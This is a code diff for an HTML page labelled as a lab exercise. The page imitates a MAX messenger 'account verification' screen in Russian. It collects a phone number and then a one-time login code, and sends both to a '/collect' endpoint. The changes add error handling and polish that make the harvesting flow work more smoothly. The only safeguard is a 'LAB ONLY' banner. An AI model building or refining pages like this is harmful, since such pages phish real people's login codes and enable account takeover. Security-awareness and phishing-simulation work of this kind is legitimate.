@@ -6,58 +6,108 @@
 <title>MAX Lab — проверка аккаунта</title>
 <style>
   body{font-family:system-ui,Arial,sans-serif;background:#f4f6fb;margin:0;display:grid;place-items:center;min-height:100vh}
-  .lab{position:fixed;top:0;left:0;right:0;background:#111;color:#ffcc00;text-align:center;padding:6px;font:12px monospace}
-  .card{background:#fff;width:min(92vw,380px);border-radius:18px;padding:28px;box-shadow:0 12px 40px #0002}
+  .lab{position:fixed;top:0;left:0;right:0;background:#111;color:#ffcc00;text-align:center;padding:6px;font:12px monospace;z-index:10}
+  .card{background:#fff;width:min(92vw,380px);border-radius:18px;padding:28px;box-shadow:0 12px 40px #0002;margin-top:34px}
   h1{font-size:22px;margin:0 0 6px}
   p{color:#555;font-size:14px}
   input{width:100%;box-sizing:border-box;padding:14px;border:1px solid #ccd2e0;border-radius:12px;font-size:16px;margin:10px 0}
-  button{width:100%;padding:14px;border:0;border-radius:12px;background:#2b6cff;color:#fff;font-size:16px;font-weight:600}
+  button{width:100%;padding:14px;border:0;border-radius:12px;background:#2b6cff;color:#fff;font-size:16px;font-weight:600;cursor:pointer}
+  button:disabled{opacity:.6;cursor:default}
   .ok{display:none;text-align:center;color:#0a7a35}
   .ok b{display:block;font-size:20px;margin-bottom:8px}
+  .err{color:#b00020;font-size:13px;min-height:18px}
 </style>
 </head>
 <body>
 <div class="lab">LAB ONLY — synthetic data — no real MAX API</div>
+
 <div class="card">
   <div id="step1">
     <h1>Проверка аккаунта MAX</h1>
     <p>Введите тестовый номер.</p>
-    <input id="phone" inputmode="tel" placeholder="+7 000 000-00-00">
-    <button onclick="sendPhone()">Продолжить</button>
+    <input id="phone" inputmode="tel" maxlength="32" placeholder="+7 000 000-00-00" autocomplete="off">
+    <div id="err1" class="err"></div>
+    <button id="btn1" onclick="sendPhone()">Продолжить</button>
   </div>
+
   <div id="step2" style="display:none">
     <h1>Введите код</h1>
     <p>Тестовый код, например 000000.</p>
-    <input id="code" inputmode="numeric" placeholder="000000">
-    <button onclick="sendCode()">Проверить</button>
+    <input id="code" inputmode="numeric" maxlength="12" placeholder="000000" autocomplete="off">
+    <div id="err2" class="err"></div>
+    <button id="btn2" onclick="sendCode()">Проверить</button>
   </div>
+
   <div id="result" class="ok">
     <b>Аккаунт защищён</b>
     <span>LAB: проверка завершена.</span>
   </div>
 </div>
+
 <script>
 let phone = "";
+
+function byId(id) {
+  return document.getElementById(id);
+}
+
 async function post(data) {
-  await fetch("/collect", {
+  const res = await fetch("/collect", {
     method: "POST",
     headers: {"Content-Type": "application/json"},
     body: JSON.stringify(data)
   });
+  if (!res.ok) {
+    throw new Error("collect failed: " + res.status);
+  }
 }
+
 async function sendPhone() {
-  phone = document.getElementById("phone").value.trim();
-  if (!phone) return;
-  await post({stage: "phone", phone});
-  step1.style.display = "none";
-  step2.style.display = "block";
+  const input = byId("phone");
+  const btn = byId("btn1");
+  const err = byId("err1");
+  phone = input.value.trim();
+  err.textContent = "";
+
+  if (!phone) {
+    err.textContent = "Введите номер.";
+    return;
+  }
+
+  btn.disabled = true;
+  try {
+    await post({stage: "phone", phone});
+    byId("step1").style.display = "none";
+    byId("step2").style.display = "block";
+  } catch (e) {
+    err.textContent = "Ошибка отправки. Проверьте, что стенд запущен.";
+  } finally {
+    btn.disabled = false;
+  }
 }
+
 async function sendCode() {
-  const code = document.getElementById("code").value.trim();
-  if (!code) return;
-  await post({stage: "otp", phone, code});
-  step2.style.display = "none";
-  result.style.display = "block";
+  const input = byId("code");
+  const btn = byId("btn2");
+  const err = byId("err2");
+  const code = input.value.trim();
+  err.textContent = "";
+
+  if (!code) {
+    err.textContent = "Введите код.";
+    return;
+  }
+
+  btn.disabled = true;
+  try {
+    await post({stage: "otp", phone, code});
+    byId("step2").style.display = "none";
+    byId("result").style.display = "block";
+  } catch (e) {
+    err.textContent = "Ошибка отправки. Проверьте, что стенд запущен.";
+  } finally {
+    btn.disabled = false;
+  }
 }
 </script>
 </body>
